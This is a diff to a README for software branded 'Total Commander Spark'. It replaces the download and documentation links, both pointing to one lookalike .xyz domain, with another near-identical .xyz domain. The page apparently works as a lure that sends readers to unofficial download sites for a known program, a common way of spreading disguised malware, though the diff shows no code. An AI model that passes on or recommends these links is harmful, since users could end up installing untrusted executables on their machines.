@@ -16,8 +16,8 @@ It keeps things simple: quick to set up, light on resources, and easy to use day
 ---
 
 ## Download & Docs
-- 📥 **Grab the latest version:** [https://total-commander-spark.softonx.xyz](https://total-commander-spark.softonx.xyz)
-- 📖 **Docs & guides:** [https://total-commander-spark.softonx.xyz](https://total-commander-spark.softonx.xyz)
+- 📥 **Grab the latest version:** [https://total-commander-spark.softax.xyz](https://total-commander-spark.softax.xyz)
+- 📖 **Docs & guides:** [https://total-commander-spark.softax.xyz](https://total-commander-spark.softax.xyz)
 
 ---
 
